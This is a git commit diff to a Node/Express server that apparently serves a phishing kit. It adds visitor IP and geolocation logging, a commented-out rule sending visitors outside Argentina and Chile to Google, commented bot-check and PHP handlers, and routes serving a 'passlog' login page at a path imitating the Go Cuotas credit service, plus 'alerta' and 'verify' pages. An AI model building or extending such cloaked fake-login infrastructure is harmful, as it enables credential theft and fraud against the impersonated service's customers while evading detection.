196d854786034fb2c119888ab9dd7c0553546c31
franlgr <grilfran90@gmail.com>
2024-05-29 04:35:00 -0300

    upadete

--- server.js
+++ server.js
@@ -1,27 +1,58 @@
 const express = require('express');
 const path = require('path');
-const { createProxyMiddleware } = require('http-proxy-middleware');
+const php = require("node-php");
+const geoip = require('geoip-lite');
 
 const app = express();
 
-// Configurar la carpeta de archivos estáticos para servir los archivos de la aplicación
 app.use(express.static(path.join(__dirname, 'dist')));
 
-// Configurar el proxy para redirigir las solicitudes a PHP
-app.use('/pwd.php', createProxyMiddleware({
-  target: 'http://localhost:8080', // URL del servidor donde está corriendo PHP
-  changeOrigin: true,
-}));
+// Configurar el middleware para ejecutar archivos PHP
+// app.use("/cons.php", php.cgi("./dist/cons.php"));
+// app.use("/botid.php", php.cgi("./dist/botid.php"));
+// app.use("/app.php", php.cgi("./dist/app.php"));
 
-// Configurar la ruta de captura (catch-all) para servir index.html
-app.get('*', (req, res) => {
+
+
+app.use((req, res, next) => {
+  const ip = req.headers['x-forwarded-for'] || req.ip; 
+  const geo = geoip.lookup(ip);
+  console.log(ip, geo);
+  
+  // Verifica si la ubicación del usuario no es Argentina ni Chile
+  // if (!(geo && ['AR', 'CL'].includes(geo.country))) {
+  //   // Redirige al usuario a otra página o sitio web
+  //   return res.redirect('https://www.google.com/');
+  // }
+
+
+  next();
+});
+
+app.get('/api/ip', (req, res) => {
+  const ip = req.headers['x-forwarded-for'] || req.ip;
+  res.json({ ip });
+});
+
+app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'dist', 'index.html'));
 });
 
-// Puerto en el que el servidor escuchará las solicitudes
+app.get('/ingreso-go-cuotas', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dist', 'passlog.html'));
+});
+
+app.get('/alerta', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dist', 'alerta.html'));
+});
+
+app.get('/verify', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dist', 'verify.html'));
+});
+
+
 const port = process.env.PORT || 3001;
 
-// Iniciar el servidor
 app.listen(port, () => {
   console.log(`Servidor escuchando en el puerto http://localhost:${port}`);
 });
